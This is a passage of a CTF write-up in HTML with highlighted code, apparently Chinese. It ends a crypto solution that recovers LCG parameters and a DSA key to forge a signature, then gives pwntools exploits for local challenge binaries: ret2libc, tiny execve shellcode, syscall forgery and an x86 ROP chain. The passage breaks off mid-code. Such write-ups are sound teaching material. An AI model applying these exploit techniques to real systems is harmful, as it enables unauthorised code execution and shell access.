punctuation\">,</span>d<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span>\n\nf1<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\nf2<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\nf3<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\nf4<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span>\nf5<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span>\nf6<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span>\nf7<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\nf8<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span>\nf9<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span>\n\nF<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>f1<span class=\"token punctuation\">,</span>f2<span class=\"token punctuation\">,</span>f3<span class=\"token punctuation\">,</span>f4<span class=\"token punctuation\">,</span>f5<span class=\"token punctuation\">,</span>f6<span class=\"token punctuation\">,</span>f7<span class=\"token punctuation\">,</span>f8<span class=\"token punctuation\">,</span>f9<span class=\"token punctuation\">]</span>\nideal <span class=\"token operator\">=</span> Ideal<span class=\"token punctuation\">(</span>F<span class=\"token punctuation\">)</span>\n\nI <span class=\"token operator\">=</span> ideal<span class=\"token punctuation\">.</span>groebner_basis<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>I<span class=\"token punctuation\">)</span>\nn <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>univariate_polynomial<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n\nb <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>univariate_polynomial<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n\nc <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>univariate_polynomial<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n\nd <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>univariate_polynomial<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nlcg<span class=\"token operator\">=</span>TripleLCG<span class=\"token punctuation\">(</span>k_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>k_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>k_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------------------------------------------'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#part 2</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b' 2\\n'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">307</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    k <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nr_l2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\ns_l <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span>\n\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'r = '</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'r = '</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b's = '</span><span class=\"token punctuation\">)</span>\n    s<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'s = '</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span>\n\n    r_l2<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span>\n    s_l<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r_l2<span class=\"token punctuation\">,</span>s_l<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>r_l2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s_l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nm <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span>\nh <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nk <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k='</span><span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span>\ninv_r<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>r_l2<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>s_l<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>k<span class=\"token operator\">%</span>q<span class=\"token operator\">-</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inv_r<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> q\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"------------------------------------------\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#part 3</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span>\n\nend_m<span class=\"token operator\">=</span><span class=\"token string\">b'b'</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'e: '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>end_m<span class=\"token punctuation\">)</span>\n\nend_h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nr_ <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>q\ns_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>end_h<span class=\"token operator\">+</span>x<span class=\"token operator\">*</span>r_<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>q\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r_<span class=\"token punctuation\">,</span>s_<span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'r: '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>r_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b's: '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p><img src=\"/images/1744633170180-60.png\" alt=\"img\" loading=\"lazy\"></p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h3><p>栈溢出，打ret2libc。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nio<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn\"</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc.so.6\"</span><span class=\"token punctuation\">)</span>\n\nplt<span class=\"token operator\">=</span><span class=\"token number\">0x0401060</span>\ngot<span class=\"token operator\">=</span><span class=\"token number\">0x0404018</span>\nrdi<span class=\"token operator\">=</span><span class=\"token number\">0x0401176</span>\nstart<span class=\"token operator\">=</span><span class=\"token number\">0x0401090</span>\nret<span class=\"token operator\">=</span><span class=\"token number\">0x040101a</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">120</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name.\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>address<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">120</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name.\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"shellcode\"><a href=\"#shellcode\" class=\"headerlink\" title=\"shellcode\"></a>shellcode</h3><p>Shellcode 限制0x12 大小，不能在mmap可执行区域二次写。</p>\n<p>所有寄存器都被清空了，除了rdi为mmap可执行区域。</p>\n<p>改eax成execve系统调用，之后再加rdi到写入&#x2F;bin&#x2F;sh的偏移，最后syscall去拿shell。</p>\n<p>eax省2字节</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">\"amd64\"</span>\n\nio <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn\"</span><span class=\"token punctuation\">)</span>\n\nsc<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">'''\nmov eax, 0x3b\nadd rdi, 0xb\nsyscall\n'''</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"/bin/sh\"</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span>\n\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"stack\"><a href=\"#stack\" class=\"headerlink\" title=\"stack\"></a>stack</h3><p>第一次输入会在0x0404060处读0xa8 字节，第二次读有栈溢出，题目模拟了canary保护会跳到sub_4011B6。</p>\n<p><img src=\"/images/1744633170177-2.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>sub_4011B6会从qword_4040a0处拿rax， fd 拿rdi， buf拿rsi，count拿rdx。</p>\n<p><img src=\"/images/1744633170177-3.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>第一次写可以溢出到这些位置来改变syscall，伪造成execve(“&#x2F;bin&#x2F;sh”, 0, 0)。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nio<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn\"</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">64</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x3b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0404108</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\nio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name?\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"say?\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"overflow\"><a href=\"#overflow\" class=\"headerlink\" title=\"overflow\"></a>overflow</h3><p>x86 静态编译，有栈溢出。</p>\n<p><img src=\"/images/1744633170177-4.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>返回之前可以栈迁移到任意地址，把栈迁移到第一次read再用第一次read写入rop即可。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nio<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn\"</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n\neax<span class=\"token operator\">=</span><span class=\"token number\">0x080b470a</span>\nebx<span class=\"token operator\">=</span><span class=\"token number\">0x08049022</span>\necx<span class=\"token operator\">=</span><span class=\"token number\">0x08049802</span>\nedx<span class=\"token operator\">=</span><span class=\"token number\">0x08060bd1</span>\n\nrop<span class=\"token operator\">=</span>p32<span class=\"token punctuation\">(</span>eax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>ebx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x80ef344</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>ecx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>edx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x08049c6a</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span><span class=\"token string\">b\"/bin/sh\\0\"</span>\n\n<span class=\"token 